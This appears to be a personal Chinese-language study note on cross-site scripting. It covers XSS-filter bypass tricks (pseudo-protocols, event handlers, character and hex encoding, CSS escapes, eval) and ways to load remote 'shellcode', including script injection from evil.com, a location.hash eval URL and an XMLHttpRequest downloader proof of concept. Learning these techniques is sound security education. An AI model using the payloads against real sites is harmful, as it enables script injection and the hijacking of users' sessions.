## 搜索引擎的搜索技巧：  
关键字加上“”表示完全匹配搜索，  
+ - and | 都具有不同的涵义   


# XSS cheat sheet 备忘录  

# XSS构造剖析  
## 绕过XSS-Filter  
XSS-Filter 即跨站脚本过滤器，用于分析用户提交的输入，并消除潜在的跨站脚本攻击、恶意HTML、简单的HTML格式错误。  
XSS-Filter 一般基于黑白名单的安全过滤策略，白名单的策略是存放可信赖的数据列表；假设应用程序使用了基于黑名单的过滤策略，XSS-Filter 会对检测到的黑名单中的数据，进行拦截、编码、消毒过滤等。   
XSS-Filter  实际上是一段过滤函数   
绕过XSS-Filter  测试  
一、利用<>标记注射html/javascript  
XSS-Filter  首要进行过滤和转义的就是```<>和<Script>```     
二、利用HTML标签属性值执行XSS    
很多HTML标记中的属性都支持``` JavaScript:[code] ``` 伪协议的形式，这种特殊的协议类型声明了URL的主体是任意的JavaScript代码，有JavaScript解释器运行。   
``` <img src="javascript:alert('xss');"> ```   
但是不是所有的web 浏览器都支持此类伪协议，但ie6支持。   

不是所有标记的属性值都能产生XSS，通常只有引用文件的属性才能触发跨站脚本  
例如： 
```
href =  
lowsrc =
bgsound =
background =
value =
action = 
dynsrc = 
```   

此外，并非所有嵌入到web页面中的脚本都是JavaScript，还有其他类型的值，比如Vbscript。  

三、如果XSS-Filter 仅仅把敏感的输入字符列入黑名单处理，如对敏感字JavaScript而言，可以利用空格、回车、TAB键等键位符绕过限制   
原理：JavaScrip通常以分号结尾，但如果JavaScript引擎确定一个语句是完整的，而这一行的结尾有换行符，那么久可以省略分号，如果一行中有多个语句，则每个语句就必须用分号结束。
> var a 
='hello world';
alert(a);

对上面的例子，引擎没有把换行符解释为语句的终止符，因为到换行符处并不是一个完整的语句，JavaScript会计息处理发现的内容，直到遇到一个发呢好或发现语句完整为止。   

四、对标签属性值转码  
对普通HTML标记的属性值进行过滤，用户还可以通过编码处理来绕过，HTML中的属性值本身支持ASCII码形式。
可以将&#01；或 &#02；插入到JavaScript或VB script头部  
Tab &#9 、换行符 &#10 、回车符 &#13可以被插入到代码中的任意地方  


因此，为了防范利用HTML标签属性值编码XSS ，最好过滤&、 #、 \等字符。

五、产生自己的事件  
事件：能够说明用户何时做了某件事情或者页面何时加载完毕。   
W3C将事件分为3类：   
用户接口：鼠标、键盘   
逻辑：处理的结果   
变化：对文档进行修改   


既然事件能让JavaScript代码运行，则意味着用户也能利用他执行跨站脚本如：
```
<img src="#" onerror=alert(/xss/)>  
```
还有大量的“测试事件型跨站脚本”  ，自己搜索   

六、利用CSS跨站剖析  43    
七、扰乱过滤规则   
原理：HTML不区分大小写   
转换大小写    
不用双引号，而是使用单引号的XSS    
不使用引号的XSS   
``` <img/src="javascript:alert('XSS');">  ``` 此代码在IE6可成功执行   

全角字符--适用于expression执行跨站代码   
样式表中的/**/会被浏览器忽略，因此可以使其来注释字符，通过插入混淆的字符绕过过滤。   

除了/**/,样式标签中的\和结束符\0也是浏览器忽略的  

还可以将CSS中关键字进行转码处理，如将e转成\65，以及改变编码中0的数量\00065。   

web浏览器的之间的差异主要体现在对HTML的渲染、对JavaScript的结束、对CSS的支持，这些差异和细节都可能引起各种不同XSS   


44部分例子不理解  

不管XSS Filter设计多严密，都有被绕过的可能。  
## 1.52利用字符编码  
如前所述，HTML标签中的某些属性值可以使用&#ASCII方式进行编码改写，这种XSS转码支持十进制和十六进制。   
 
 还可以在每个十进制字符的编码后加上;   
 如 ``` &#46;```     
 以及加数量不同的0，如``` &#0000046 ```     
 十六进制使用方式类似   

 ### eval（）函数  
 JavaScript中的eval()函数，可以计算字符串，并执行其中的JavaScript代码。  
 eval() 函数会将传入的字符串当做 JavaScript 代码进行执行。  
例子：```<script> eval("alert('XSS')") </script> ```  

可以使用\连接十六进制字符串，然后使用eval()函数执行十六进制字符串形式的脚本。如：alert（'XSS'）十六进制转码的结果与该函数结合起来   
```<script> eval("十六进制转码结果") </script> ```    
eval()也可以执行10进制形式的脚本，但需要与string.fromCharCode()结合使用，该函数用于将字符转为ASCII的值。   

样式表也支持分析和解释\链接的十六进制字符串形式  
``` <style> BODY {background: \75\72\74\72\} <style>```   
style属性中的JavaScript、expression等字符一般都会被过滤，但是经过十六进制编码后则可以逃避过滤。  

JavaScript支持Unicode、escapes、十六进制、八进制等编码形式，这些编码技术都可以用于XSS   


Microsoft提供了script Encode 脚本加密机制，可以对脚本加密，经过加密的脚本能在IE下正常运行，但在其他浏览器中不被识别。这一部分涉及加密与解密，书中没有明确指出，需要自学  

## 1.53 拆分跨站法  

## 1.6 shellcode  
shellcode：最初是溢出程序和蠕虫病毒的核心，实际上是指利用一个漏洞时所执行的代码。在XSS中，指由JavaScript等脚本编写的XSS利用代码。   
Exploit：便是完整编写好的漏洞利用工具或程序，具有一定的攻击性。  
Exploit包含Shellcode   
POC：proof of content，一段证明漏洞存在的程序代码片段。   

攻击者往往把Shellcode写道远程服务器上，然后使用``` <script> ```等标签对其调用，或者使用一些本地存储对象对其进行存储和调用。    
## 1.61 动态调用远程JavaScript    
使用script标签动态调用远程JavaScript   
基于DOM的方法创建和插入节点，把脚本或HTML注入到网页   
```
var s = document.createElement("script");
s.src="http://www.evil.com/xss.js";
document.getElementByTagName("head")[0].appendChild(s);
动态创建一个<script>标签，并设置其src属性指向，最后将JavaScript代码
插入到网页的<head>标签之后
```

## 1.62 window.location.hash  
如果仅仅时为了解决URL字符长度问题，还可以使用这个属性实现XSS Shellcode   
location是JavaScript管理地址栏的内置对象，location.href用来管理页面的URL，用locatin.href=url可以直接将页面重定向URL。    
location.hash可以用来获取或者设置页面的标签值。  例如：http://domain/#adim的 location.hash="#admin"。   

结合location.hash的特性调用Shellcode  ：
``` http://www.bug.com/veiw.php?sort="><script>eval(location.hash.substr(1))</script>#alert('XSS') 
eval(location.hash.substr(1))的作用是抽取#字符后面的字符，之后使用eval函数来执行其中的JavaScript代码。
```
## 1.63 XSS Downloader  
存储和调用Shellcode，即将其存储到网站的数据库中，包括网页信息、文章内容、个人资料等地方，然后再把他们下载下来执行。   
其实就是打造一个XSS downloader ，事先把Shellcode写在网站的某个页面，再利用XMLHTTP控件向网站发送HTTP请求，get或post，然后执行返回的数据。   

POC：  
```
function XSS(){
    a=new XMLHttpRequest；
    a.open('get','http://www.bug.com/11221.html',false);
    a.send();
    b=a.responseText;
    // unescape(),计算生成一个新的字符串，其中的十六进制转义序列将被其表示
    的字符替换。    
    //eval(); 是全局对象的一个函数属性，eval() 的参数是一个字符串。如果字符串表示的是表达式，eval() 会对表达式进行求值。如果参数表示一个或多个 JavaScript 语句，那么eval() 就会执行这些语句。
    eval(unescape(b.substring(b.indexOf('BOF|')+4,b.indexOf('|EOF'))));
}
XSS();
```
http://www.bug.com/11221.html  页面写入了Shellcode代码  
Xx09abxdddxBOF|alert(/xss)|EOFxxxx44xx1212





？location？  
？substring？
？indexOf()？

## HTMLIFrameElement.contentWindow
contentWindow 属性返回当前HTMLIFrameElement的Window对象. 你可以使用这个Window 对象去访问这个iframe的文档和它内部的DOM. 这个是可读属性, 但是它的属性像全局Window 一样是可以操作的.   

## iframe
HTML内联框架元素 ``` (<iframe>)``` 表示嵌套的browsing context。它能够将另一个HTML页面嵌入到当前页面中。

## HTMLFormElement.action
HTMLFormElement.action 这个js语句能够定义一个```<form>```元素中的action属性  
表单的action属性是在服务器上提交表单，这个属性可以被检索或者设置。

## escape()已废弃  
生成新的由十六进制转义序列替换的字符串，使用 encodeURI 或 encodeURIComponent 代替.

##  document.write（）
Document.write() 方法将一个文本字符串写入一个由 document.open() 打开的文档流（document stream）。

## loacalstorage  

## 

## 1.64 备选存储技术  
把XSS Shellcode 存储在客户端本地域中，如：HTTP cookie；userData；localstorage。   
COOKIE,存储容量有限被限制在4K内。

userData：是微软专门为IE在系统中开辟的一块内存空间，最少指出640KB名单只能在IE中使用。  